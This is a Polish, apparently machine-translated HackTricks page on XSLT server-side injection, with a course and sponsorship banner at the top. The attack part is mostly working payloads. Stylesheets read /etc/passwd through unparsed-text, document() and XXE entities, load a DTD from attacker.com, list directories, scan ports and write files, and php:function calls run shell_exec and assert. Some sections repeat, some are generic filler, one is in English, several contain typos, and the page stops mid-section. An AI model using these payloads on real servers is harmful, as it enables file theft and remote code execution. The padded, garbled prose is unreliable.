# Wstrzykiwanie kodu po stronie serwera XSLT (Extensible Stylesheet Language Transformations)

<details>

<summary><strong>Dowiedz si, jak hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Pracujesz w **firmie zajmujcej si cyberbezpieczestwem**? Chcesz zobaczy, jak Twoja **firma jest reklamowana w HackTricks**? A mo偶e chcesz mie dostp do **najnowszej wersji PEASS lub pobra HackTricks w formacie PDF**? Sprawd藕 [**PLAN SUBSKRYPCYJNY**](https://github.com/sponsors/carlospolop)!
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* **Docz do** [****](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** mnie na **Twitterze** [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do repozytorium [hacktricks](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Podstawowe informacje

XSLT to technologia stosowana do przeksztacania dokument贸w XML na r贸偶ne formaty. Istniej trzy wersje: 1, 2 i 3, z czego wersja 1 jest najczciej u偶ywana. Proces transformacji mo偶e by wykonywany zar贸wno po stronie serwera, jak i w przegldarce.

Najczciej u偶ywane frameworki to:

- **Libxslt** od Gnome,
- **Xalan** od Apache,
- **Saxon** od Saxonica.

Aby wykorzysta podatnoci zwizane z XSLT, konieczne jest przechowywanie znacznik贸w xsl po stronie serwera, a nastpnie uzyskanie do nich dostpu. Przykad takiej podatnoci zosta udokumentowany w nastpujcym 藕r贸dle: [https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/).

## Przykad - Samouczek
```bash
sudo apt-get install default-jdk
sudo apt-get install libsaxonb-java libsaxon-java
```
{% code title="xml.xml" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<catalog>
<cd>
<title>CD Title</title>
<artist>The artist</artist>
<company>Da Company</company>
<price>10000</price>
<year>1760</year>
</cd>
</catalog>
```
{% code title="xsl.xsl" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<html>
<body>
<h2>The Super title</h2>
<table border="1">
<tr bgcolor="#9acd32">
<th>Title</th>
<th>artist</th>
</tr>
<tr>
<td><xsl:value-of select="catalog/cd/title"/></td>
<td><xsl:value-of select="catalog/cd/artist"/></td>
</tr>
</table>
</body>
</html>
</xsl:template>
</xsl:stylesheet>
```
{% endcode %}

Wykonaj:
```xml
saxonb-xslt -xsl:xsl.xsl xml.xml

Warning: at xsl:stylesheet on line 2 column 80 of xsl.xsl:
Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
<html>
<body>
<h2>The Super title</h2>
<table border="1">
<tr bgcolor="#9acd32">
<th>Title</th>
<th>artist</th>
</tr>
<tr>
<td>CD Title</td>
<td>The artist</td>
</tr>
</table>
</body>
</html>
```
### Odcisk palca

{% code title="detection.xsl" %}
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
Version: <xsl:value-of select="system-property('xsl:version')" /><br />
Vendor: <xsl:value-of select="system-property('xsl:vendor')" /><br />
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" /><br />
<xsl:if test="system-property('xsl:product-name')">
Product Name: <xsl:value-of select="system-property('xsl:product-name')" /><br />
</xsl:if>
<xsl:if test="system-property('xsl:product-version')">
Product Version: <xsl:value-of select="system-property('xsl:product-version')" /><br />
</xsl:if>
<xsl:if test="system-property('xsl:is-schema-aware')">
Is Schema Aware ?: <xsl:value-of select="system-property('xsl:is-schema-aware')" /><br />
</xsl:if>
<xsl:if test="system-property('xsl:supports-serialization')">
Supports Serialization: <xsl:value-of select="system-property('xsl:supportsserialization')"
/><br />
</xsl:if>
<xsl:if test="system-property('xsl:supports-backwards-compatibility')">
Supports Backwards Compatibility: <xsl:value-of select="system-property('xsl:supportsbackwards-compatibility')"
/><br />
</xsl:if>
</xsl:template>
</xsl:stylesheet>
```
{% endcode %}

I wykonaj
```xml
$saxonb-xslt -xsl:detection.xsl xml.xml

Warning: at xsl:stylesheet on line 2 column 80 of detection.xsl:
Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
<h2>XSLT identification</h2><b>Version:</b>2.0<br><b>Vendor:</b>SAXON 9.1.0.8 from Saxonica<br><b>Vendor URL:</b>http://www.saxonica.com/<br>
```
### Odczytaj lokalny plik

{% code title="read.xsl" %}
```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:template match="/">
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')"/>
</xsl:template>
</xsl:stylesheet>
```
{% endcode %}
```xml
$ saxonb-xslt -xsl:read.xsl xml.xml

Warning: at xsl:stylesheet on line 1 column 111 of read.xsl:
Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
<?xml version="1.0" encoding="UTF-8"?>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
```
### SSRF

Server-Side Request Forgery (SSRF) to atak polegajcy na zmuszaniu serwera do wykonania 偶dania HTTP na zewntrznym zasobie, zamiast na zamierzonej lokalizacji. Atakujcy mo偶e wykorzysta t luk, aby uzyska dostp do wra偶liwych danych lub sieci wewntrznej.

#### Przykady ataku SSRF

1. Wykorzystanie funkcji do pobierania plik贸w

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xsl:stylesheet [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:user="http://mycompany.com/mynamespace">
  <xsl:output method="text" encoding="UTF-8"/>
  <xsl:template match="/">
    <xsl:value-of select="document(&file;)"/>
  </xsl:template>
</xsl:stylesheet>
```

2. Wykorzystanie funkcji do wykonania 偶da HTTP

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xsl:stylesheet [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:user="http://mycompany.com/mynamespace">
  <xsl:output method="text" encoding="UTF-8"/>
  <xsl:template match="/">
    <xsl:variable name="response" select="user:sendRequest('http://internal-server.com/secret-data')"/>
    <xsl:value-of select="$response"/>
  </xsl:template>
</xsl:stylesheet>
```

#### Zabezpieczenia przed atakami SSRF

- Walidacja i filtrowanie danych wejciowych, aby zapobiec wstrzykiwaniu zoliwych URI.
- Ograniczenie uprawnie serwera, aby uniemo偶liwi dostp do wra偶liwych danych lub sieci wewntrznej.
- U偶ywanie biaej listy zezwole dla 偶da HTTP, aby ograniczy dostp tylko do zaufanych zasob贸w.
- Monitorowanie i rejestrowanie 偶da HTTP, aby wykry podejrzane aktywnoci.
```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:include href="http://127.0.0.1:8000/xslt"/>
<xsl:template match="/">
</xsl:template>
</xsl:stylesheet>
```
### Wersje

Mo偶e by wicej lub mniej funkcji, w zale偶noci od u偶ytej wersji XSLT:

* [https://www.w3.org/TR/xslt-10/](https://www.w3.org/TR/xslt-10/)
* [https://www.w3.org/TR/xslt20/](https://www.w3.org/TR/xslt20/)
* [https://www.w3.org/TR/xslt-30/](https://www.w3.org/TR/xslt-30/)

## Odcisk palca

Przelij to i uzyskaj informacje
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
Version: <xsl:value-of select="system-property('xsl:version')" /><br />
Vendor: <xsl:value-of select="system-property('xsl:vendor')" /><br />
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" /><br />
<xsl:if test="system-property('xsl:product-name')">
Product Name: <xsl:value-of select="system-property('xsl:product-name')" /><br />
</xsl:if>
<xsl:if test="system-property('xsl:product-version')">
Product Version: <xsl:value-of select="system-property('xsl:product-version')" /><br />
</xsl:if>
<xsl:if test="system-property('xsl:is-schema-aware')">
Is Schema Aware ?: <xsl:value-of select="system-property('xsl:is-schema-aware')" /><br />
</xsl:if>
<xsl:if test="system-property('xsl:supports-serialization')">
Supports Serialization: <xsl:value-of select="system-property('xsl:supportsserialization')"
/><br />
</xsl:if>
<xsl:if test="system-property('xsl:supports-backwards-compatibility')">
Supports Backwards Compatibility: <xsl:value-of select="system-property('xsl:supportsbackwards-compatibility')"
/><br />
</xsl:if>
</xsl:template>
</xsl:stylesheet>
```
## SSRF

Server-Side Request Forgery (SSRF) to atak polegajcy na zmuszaniu serwera do wykonania 偶dania HTTP na zewntrznym zasobie, zamiast na zamierzonej lokalizacji. Atakujcy mo偶e wykorzysta t luk, aby uzyska dostp do wra偶liwych danych lub sieci wewntrznej.

### Wykorzystanie SSRF

SSRF mo偶na wykorzysta na r贸偶ne sposoby, takie jak:

- Skanowanie sieci wewntrznej: Atakujcy mo偶e wykorzysta SSRF do skanowania sieci wewntrznej, identyfikujc dostpne usugi i otwarte porty.
- Wykradanie danych: Atakujcy mo偶e wykorzysta SSRF do uzyskania dostpu do wra偶liwych danych, takich jak hasa, klucze API lub pliki konfiguracyjne.
- Ataki na usugi wewntrzne: Atakujcy mo偶e wykorzysta SSRF do atakowania usug wewntrznych, takich jak bazy danych, serwery plik贸w lub kolejki wiadomoci.

### Techniki SSRF

SSRF mo偶na wykorzysta za pomoc r贸偶nych technik, takich jak:

- Wykorzystanie funkcji URL: Atakujcy mo偶e manipulowa parametrami URL, aby zmusi serwer do wykonania 偶dania na zewntrznym zasobie.
- Wykorzystanie protoko贸w nie-HTTP: Atakujcy mo偶e wykorzysta protokoy takie jak FTP, SMB lub DNS, aby uzyska dostp do zasob贸w wewntrznych.
- Wykorzystanie bd贸w parsowania: Atakujcy mo偶e wykorzysta bdy parsowania danych wejciowych, takie jak XML lub JSON, aby zmusi serwer do wykonania nieautoryzowanych 偶da.

### Zapobieganie SSRF

Aby zapobiec atakom SSRF, mo偶na podj nastpujce rodki ostro偶noci:

- Walidacja i filtrowanie danych wejciowych: Nale偶y dokadnie sprawdza i filtrowa wszelkie dane wejciowe, takie jak parametry URL, aby zapobiec manipulacji.
- Ograniczenie uprawnie: Nale偶y ograniczy uprawnienia serwera, aby uniemo偶liwi dostp do wra偶liwych danych lub sieci wewntrznej.
- U偶ywanie biaej listy adres贸w URL: Nale偶y u偶ywa biaej listy adres贸w URL, aby ograniczy dostp do zaufanych zasob贸w.
- Monitorowanie i reagowanie: Nale偶y monitorowa logi serwera i reagowa na podejrzane aktywnoci, takie jak nieautoryzowane 偶dania HTTP.

### Podsumowanie

SSRF to potencjalnie niebezpieczna luka w zabezpieczeniach, kt贸ra mo偶e prowadzi do nieautoryzowanego dostpu do wra偶liwych danych lub sieci wewntrznej. Aby zapobiec atakom SSRF, nale偶y dokadnie walidowa i filtrowa dane wejciowe oraz ogranicza uprawnienia serwera. Monitorowanie log贸w serwera jest r贸wnie偶 wa偶ne w celu wykrywania i reagowania na podejrzane aktywnoci.
```xml
<esi:include src="http://10.10.10.10/data/news.xml" stylesheet="http://10.10.10.10//news_template.xsl">
</esi:include>
```
## Wstrzykiwanie kodu JavaScript

Wstrzykiwanie kodu JavaScript jest jedn z najczciej wykorzystywanych technik ataku na aplikacje internetowe. Pozwala ona na wykonanie kodu JavaScript na stronie internetowej, co mo偶e prowadzi do r贸偶nych niepo偶danych skutk贸w, takich jak kradzie偶 danych, przechwytywanie sesji u偶ytkownika czy zoliwe przekierowania.

### Sposoby wstrzykiwania kodu JavaScript

1. **Wstrzykiwanie kodu JavaScript w pola formularzy**: Atakujcy mo偶e wstrzykn kod JavaScript poprzez wprowadzenie go w pola formularzy, takie jak pola tekstowe czy pola wyboru. Gdy u偶ytkownik wysya formularz, kod JavaScript zostaje wykonany na stronie.

2. **Wstrzykiwanie kodu JavaScript w adres URL**: Atakujcy mo偶e doda kod JavaScript do adresu URL, kt贸ry zostanie wykonany po zaadowaniu strony. Mo偶e to prowadzi do przechwycenia danych lub wykonania innych zoliwych dziaa.

3. **Wstrzykiwanie kodu JavaScript poprzez bdy w walidacji**: Jeli aplikacja internetowa nieprawidowo waliduje dane wprowadzane przez u偶ytkownika, atakujcy mo偶e wykorzysta ten bd do wstrzyknicia kodu JavaScript.

### Skutki wstrzykiwania kodu JavaScript

Wstrzyknicie kodu JavaScript mo偶e prowadzi do r贸偶nych niebezpiecznych sytuacji, takich jak:

- **Kradzie偶 danych**: Atakujcy mo偶e wykorzysta wstrzyknity kod JavaScript do kradzie偶y poufnych danych, takich jak hasa, dane osobowe czy informacje finansowe.

- **Przechwycenie sesji u偶ytkownika**: Wstrzyknicie kodu JavaScript mo偶e umo偶liwi atakujcemu przechwycenie sesji u偶ytkownika, co pozwala mu na przejcie kontroli nad kontem u偶ytkownika.

- **Zoliwe przekierowania**: Atakujcy mo偶e wykorzysta wstrzyknity kod JavaScript do przekierowania u偶ytkownika na zoliwe strony internetowe, kt贸re mog zawiera zoliwe oprogramowanie.

### Zapobieganie wstrzykiwaniu kodu JavaScript

Aby zapobiec wstrzykiwaniu kodu JavaScript, nale偶y podj nastpujce rodki ostro偶noci:

- **Walidacja danych**: Upewnij si, 偶e wszystkie dane wprowadzane przez u偶ytkownika s prawidowo walidowane i filtrowane, aby zapobiec wstrzykiwaniu kodu JavaScript.

- **U偶ywanie bezpiecznych funkcji**: Korzystaj z bezpiecznych funkcji i bibliotek do manipulacji danymi, takich jak funkcje do kodowania i dekodowania danych.

- **Ograniczanie uprawnie**: Ogranicz uprawnienia u偶ytkownik贸w do minimalnego niezbdnego poziomu, aby zmniejszy ryzyko wstrzykiwania kodu JavaScript.

- **Regularne aktualizacje**: Regularnie aktualizuj oprogramowanie i biblioteki, aby zapobiec wykorzystaniu znanych podatnoci.

- **Monitorowanie log贸w**: Monitoruj logi aplikacji w celu wykrywania i reagowania na pr贸by wstrzykiwania kodu JavaScript.

### Podsumowanie

Wstrzykiwanie kodu JavaScript jest powszechnie wykorzystywan technik ataku na aplikacje internetowe. Aby zapobiec temu rodzajowi ataku, nale偶y odpowiednio walidowa dane wprowadzane przez u偶ytkownik贸w, korzysta z bezpiecznych funkcji i bibliotek, ogranicza uprawnienia u偶ytkownik贸w oraz regularnie aktualizowa oprogramowanie. Monitorowanie log贸w aplikacji jest r贸wnie偶 wa偶ne w celu wykrywania i reagowania na pr贸by wstrzykiwania kodu JavaScript.
```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<script>confirm("We're good");</script>
</xsl:template>
</xsl:stylesheet>
```
## Wywietlanie katalogu (PHP)

### **Opendir + readdir**
```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:value-of select="php:function('opendir','/path/to/dir')"/>
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
</xsl:template></xsl:stylesheet>
```
### **Assert (var\_dump + scandir + false)**

Assert (var\_dump + scandir + false) to technika wykorzystujca wstrzyknicie kodu XSLT (Extensible Stylesheet Language Transformations) w celu uzyskania informacji o serwerze i przegldaniu jego plik贸w. Ta technika polega na wykorzystaniu funkcji var\_dump() do wywietlenia zawartoci obiektu, a nastpnie funkcji scandir() do przegldania plik贸w na serwerze. Ustawienie wartoci false w celu uniknicia wywietlania bd贸w.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
<xsl:copy-of name="asd" select="php:function('assert','var_dump(scandir(chr(46).chr(47)))==3')" />
<br />
</body>
</html>
```
### **Wczytywanie plik贸w**

#### **Wewntrzne - PHP**

W przypadku ataku XSLT Server-Side Injection, mo偶emy wykorzysta funkcj `document()` w celu odczytania plik贸w na serwerze. Funkcja `document()` pozwala na odczytanie plik贸w z lokalnego systemu plik贸w lub z sieci.

Aby odczyta plik z lokalnego systemu plik贸w, mo偶emy u偶y nastpujcego kodu:

```php
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="document('file:///etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>
```

W powy偶szym przykadzie odczytujemy plik `/etc/passwd` z lokalnego systemu plik贸w.

Aby odczyta plik z sieci, mo偶emy u偶y nastpujcego kodu:

```php
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="document('http://example.com/secret.txt')"/>
  </xsl:template>
</xsl:stylesheet>
```

W powy偶szym przykadzie odczytujemy plik `secret.txt` z witryny `http://example.com`.

Pamitaj, 偶e dostp do plik贸w mo偶e by ograniczony przez uprawnienia serwera, wic nie zawsze bdziesz w stanie odczyta dowolny plik.
```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:template match="/">
<xsl:value-of select="unparsed-text('/etc/passwd', utf-8')"/>
</xsl:template>
</xsl:stylesheet>
```
### **Wewntrzne - XXE**

XXE (ang. External Entity Injection) to atak, kt贸ry wykorzystuje podatno w przetwarzaniu danych XML. Atakujcy mo偶e wstrzykn zewntrzne encje do dokumentu XML, co mo偶e prowadzi do ujawnienia poufnych informacji, wykonania zdalnego kodu lub atak贸w typu DoS (Denial of Service).

#### **Podatno na XXE w XSLT**

Podatno na XXE mo偶e wystpi w przypadku przetwarzania danych XML za pomoc XSLT (Extensible Stylesheet Language Transformations). XSLT jest jzykiem su偶cym do transformacji dokument贸w XML na inne formaty, takie jak HTML lub tekst.

#### **Wykorzystanie XXE w XSLT**

Aby wykorzysta podatno na XXE w XSLT, atakujcy mo偶e wstrzykn zewntrzne encje do arkusza styl贸w XSLT. Mo偶e to by osignite poprzez odwoanie si do zewntrznego pliku DTD (Document Type Definition) lub za pomoc encji wbudowanych w sam dokument XML.

#### **Skutki XXE w XSLT**

Wykorzystanie XXE w XSLT mo偶e prowadzi do r贸偶nych skutk贸w, takich jak:

- Ujawnienie poufnych informacji: Atakujcy mo偶e uzyska dostp do poufnych danych, takich jak hasa, klucze API, dane u偶ytkownik贸w itp.
- Wykonanie zdalnego kodu: Atakujcy mo偶e wykona dowolny kod na serwerze, co mo偶e prowadzi do penej kontroli nad systemem.
- Ataki typu DoS: Atakujcy mo偶e spowodowa niedostpno usugi poprzez wykorzystanie du偶ych zasob贸w serwera.

#### **Zapobieganie XXE w XSLT**

Aby zapobiec atakom XXE w XSLT, nale偶y podj nastpujce rodki ostro偶noci:

- Wyczenie obsugi zewntrznych encji: Wyczenie obsugi zewntrznych encji w parserze XML mo偶e zapobiec atakom XXE.
- Walidacja danych wejciowych: Nale偶y dokadnie sprawdza i walidowa dane wejciowe, aby upewni si, 偶e nie zawieraj zoliwych encji.
- U偶ywanie bezpiecznych parser贸w XML: Wybieranie bezpiecznych parser贸w XML, kt贸re domylnie wyczaj obsug zewntrznych encji, mo偶e pom贸c w zapobieganiu atakom XXE.

#### **Podsumowanie**

XXE w XSLT to powa偶na podatno, kt贸ra mo偶e prowadzi do ujawnienia poufnych informacji, wykonania zdalnego kodu lub atak贸w typu DoS. Aby zapobiec atakom XXE, nale偶y wyczy obsug zewntrznych encji, dokadnie walidowa dane wejciowe i u偶ywa bezpiecznych parser贸w XML.
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM "/etc/passwd">]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
&ext_file;
</xsl:template>
</xsl:stylesheet>
```
### **Przez HTTP**

XSLT Server-Side Injection (XSSI) is a technique that allows an attacker to inject malicious XSLT code into a vulnerable server-side application. This can lead to various security vulnerabilities, such as information disclosure, remote code execution, and server-side request forgery.

XSLT (Extensible Stylesheet Language Transformations) is a language used to transform XML documents into other formats, such as HTML or plain text. It is commonly used in web applications to generate dynamic content.

To perform an XSSI attack, the attacker needs to identify a vulnerable server-side application that uses XSLT transformations. This can be done through manual analysis or automated scanning tools.

Once a vulnerable application is identified, the attacker can craft a malicious XSLT payload and inject it into the application. The payload can be designed to exploit specific vulnerabilities or perform general attacks, such as extracting sensitive information from the server or executing arbitrary code.

The injection of the payload can be done through various vectors, such as user input fields, HTTP headers, or XML data. The attacker needs to understand the application's input validation and processing mechanisms to successfully inject the payload.

To mitigate XSSI attacks, developers should implement proper input validation and output encoding techniques. They should also avoid using user-supplied data directly in XSLT transformations without proper sanitization.

Pentesters can detect XSSI vulnerabilities by analyzing the application's response for unexpected XSLT processing errors or by injecting payloads and observing the server's response.

Overall, XSSI attacks can have severe consequences for the security of a web application. It is important for developers and pentesters to be aware of this technique and take appropriate measures to prevent and detect such attacks.
```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<xsl:value-of select="document('/etc/passwd')"/>
</xsl:template>
</xsl:stylesheet>
```

```xml
<!DOCTYPE xsl:stylesheet [
<!ENTITY passwd SYSTEM "file:///etc/passwd" >]>
<xsl:template match="/">
&passwd;
</xsl:template>
```
### **Wewntrzne (funkcja PHP)**
```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:value-of select="php:function('file_get_contents','/path/to/file')"/>
</xsl:template>
</xsl:stylesheet>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
<xsl:copy-of name="asd" select="php:function('assert','var_dump(file_get_contents(scandir(chr(46).chr(47))[2].chr(47).chr(46).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100)))==3')" />
<br />
</body>
</html>
```
### Skanowanie port贸w

Port scanowanie jest jedn z podstawowych technik u偶ywanych podczas test贸w penetracyjnych. Polega na skanowaniu otwartych port贸w na docelowym systemie w celu identyfikacji usug dziaajcych na tych portach. Skanowanie port贸w mo偶e pom贸c w zidentyfikowaniu potencjalnych podatnoci i sabych punkt贸w w systemie.

Istnieje wiele narzdzi dostpnych do przeprowadzania skanowania port贸w, takich jak Nmap, Masscan, Zmap, itp. Te narzdzia umo偶liwiaj skanowanie pojedynczych port贸w, zakres贸w port贸w lub nawet caych sieci w poszukiwaniu otwartych port贸w.

Podczas skanowania port贸w istniej r贸偶ne techniki, takie jak skanowanie SYN, skanowanie TCP, skanowanie UDP, skanowanie ACK, skanowanie FIN, skanowanie Xmas, itp. Ka偶da z tych technik ma swoje wasne zastosowanie i mo偶e dostarczy r贸偶nych informacji na temat otwartych port贸w i usug.

Skanowanie port贸w jest wa偶nym krokiem w procesie test贸w penetracyjnych, poniewa偶 umo偶liwia identyfikacj potencjalnych wektor贸w ataku i podatnoci. Jest to r贸wnie偶 przydatne narzdzie dla administrator贸w system贸w, kt贸rzy chc monitorowa i zabezpiecza swoje sieci przed nieautoryzowanym dostpem.
```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:value-of select="document('http://example.com:22')"/>
</xsl:template>
</xsl:stylesheet>
```
## Zapisz do pliku

### XSLT 2.0

XSLT 2.0 umo偶liwia zapisywanie danych do pliku przy u偶yciu funkcji `xsl:result-document`. Ta funkcja pozwala na zapisywanie wynik贸w przeksztace XSLT do pliku na serwerze. Aby to zrobi, nale偶y poda cie偶k do pliku jako argument funkcji `xsl:result-document`. Na przykad:

```xml
<xsl:result-document href="sciezka/do/pliku.txt">
    <xsl:text>Zawartosc pliku</xsl:text>
</xsl:result-document>
```

W powy偶szym przykadzie, wynik przeksztacenia XSLT zostanie zapisany do pliku o nazwie "plik.txt" na serwerze. Mo偶na r贸wnie偶 u偶y zmiennych XSLT do dynamicznego tworzenia cie偶ki do pliku.
```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:result-document href="local_file.txt">
<xsl:text>Write Local File</xsl:text>
</xsl:result-document>
</xsl:template>
</xsl:stylesheet>
```
### **Rozszerzenie Xalan-J**

Xalan-J jest popularnym narzdziem do przetwarzania jzyka XSLT (Extensible Stylesheet Language Transformations). Jest to biblioteka Java, kt贸ra umo偶liwia tworzenie i stosowanie arkuszy styl贸w XSLT w celu transformacji dokument贸w XML.

Jednak Xalan-J zawiera r贸wnie偶 rozszerzenia, kt贸re mog by wykorzystane do wykonania kodu Java na serwerze poprzez wstrzyknicie kodu XSLT. To zjawisko jest znane jako XSLT Server-Side Injection.

W przypadku ataku XSLT Server-Side Injection, atakujcy mo偶e wstrzykn kod XSLT, kt贸ry zostanie wykonany na serwerze. To mo偶e prowadzi do r贸偶nych konsekwencji, takich jak odczyt plik贸w, wykonanie dowolnego kodu Java, a nawet zdalne wykonanie kodu.

Aby przeprowadzi atak XSLT Server-Side Injection, atakujcy musi znale藕 podatny punkt kocowy, kt贸ry akceptuje dane wejciowe XSLT i wykonuje je na serwerze. Nastpnie atakujcy mo偶e wstrzykn zoliwy kod XSLT, kt贸ry zostanie wykonany na serwerze.

Aby zabezpieczy si przed atakami XSLT Server-Side Injection, nale偶y:

- Unika bezporedniego wykonania kodu XSLT na serwerze.
- Sprawdza i filtrowa dane wejciowe XSLT, aby zapobiec wstrzykniciu zoliwego kodu.
- U偶ywa najnowszych wersji bibliotek Xalan-J, kt贸re mog zawiera poprawki zwizane z bezpieczestwem.

Wa偶ne jest, aby zrozumie zagro偶enia zwizane z XSLT Server-Side Injection i podj odpowiednie rodki ostro偶noci, aby chroni serwery przed tym rodzajem ataku.
```xml
<xsl:template match="/">
<redirect:open file="local_file.txt"/>
<redirect:write file="local_file.txt"/> Write Local File</redirect:write>
<redirect:close file="loxal_file.txt"/>
</xsl:template>
```
Inne sposoby zapisywania plik贸w w formacie PDF

## Dodawanie zewntrznego XSL
```xml
<xsl:include href="http://extenal.web/external.xsl"/>
```

```xml
<?xml version="1.0" ?>
<?xml-stylesheet type="text/xsl" href="http://external.web/ext.xsl"?>
```
## Wykonaj kod

### **php:function**
```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:value-of select="php:function('shell_exec','sleep 10')" />
</xsl:template>
</xsl:stylesheet>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
<xsl:copy-of name="asd" select="php:function('assert','var_dump(scandir(chr(46).chr(47)));')" />
<br />
</body>
</html>
```
Wykonaj kod za pomoc innych framework贸w w pliku PDF

### **Wicej jzyk贸w**

**Na tej stronie znajdziesz przykady RCE w innych jzykach:** [**https://vulncat.fortify.com/en/detail?id=desc.dataflow.java.xslt\_injection#C%23%2FVB.NET%2FASP.NET**](https://vulncat.fortify.com/en/detail?id=desc.dataflow.java.xslt\_injection#C%23%2FVB.NET%2FASP.NET) **(C#, Java, PHP)**

## **Dostp do statycznych funkcji PHP z klas**

Nastpujca funkcja wywoa statyczn metod `stringToUrl` z klasy XSL:
```xml
<!--- More complex test to call php class function-->
